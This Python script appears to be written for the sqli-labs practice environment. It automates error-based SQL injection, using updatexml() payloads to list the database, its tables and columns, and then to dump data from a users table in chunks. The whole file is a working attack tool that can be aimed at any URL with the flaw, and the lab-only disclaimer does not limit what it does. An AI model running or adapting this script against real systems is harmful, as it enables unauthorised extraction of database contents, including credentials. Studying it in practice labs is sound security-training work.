import re
import requests
import argparse

parser = argparse.ArgumentParser(usage="代码仅用于sqli-labs关卡")


def current_db(url):
    payload = url + ' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+'
    response = requests.get(payload).text
    db = re.findall(r'~(.*?)~', response)[0]
    print(f'current-db: {db}')
    current_tables(url, db)

def current_tables(url ,db):
    payload = url + \
        ' and updatexml(1,concat(1,(select distinct concat(0x7e, (select group_concat(table_name)),0x7e) from information_schema.tables where table_schema=database()),0x7e),1) --+'
    response = requests.get(payload).text
    tables = re.findall(r'~(.*?)~', response)[0]
    table_list = tables.split(',')
    table_dist = {}
    for i in range(len(table_list)):
        table_dist[i] = table_list[i]
    print(f'current-tables: {table_dist}',)
    table_num = int(input('请选择数据库:'))
    table = table_dist[table_num]
    current_columns(url, table)

def current_columns(url, table):
    payload = url + f" and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=database() and table_name='{table}'),0x7e),1) --+"
    response = requests.get(payload).text
    columns = re.findall(r'~~(.*?)~~', response)[0]
    columns_list = columns.split(',')
    columns_dist = {}
    for i in range(len(columns_list)):
        columns_dist[i] = columns_list[i]
    print(f'current-tables: {columns_dist}',)
    column_num_list = input('请选择列名(多个用空格隔开):').split()
    query_column = []
    for i in column_num_list:
        query_column.append(columns_dist[int(i)])
    current_data(url, query_column)
def current_data(url, query_column):
    for i in query_column:
        j = 1
        datas = ''
        while True:
            payload = url + \
                f" and updatexml(1,concat(0x7e,mid((select group_concat({i}) from users),{j},31),0x7e),1)--+"
            response = requests.get(payload).text
            data = re.findall(r"XPATH syntax error: '(.*?)'", response)[0]
            if data.count('~') == 2:
                datas += data.replace('~', '')
                break
            else:
                datas += data.replace('~', '')
                j +=31
        print(i + ':\t' + datas)
        
    
if __name__ == "__main__":
    parser.add_argument('-u', '--url', type=str, metavar='', help='闭合后的URL')
    args = parser.parse_args()
    current_db(args.url)

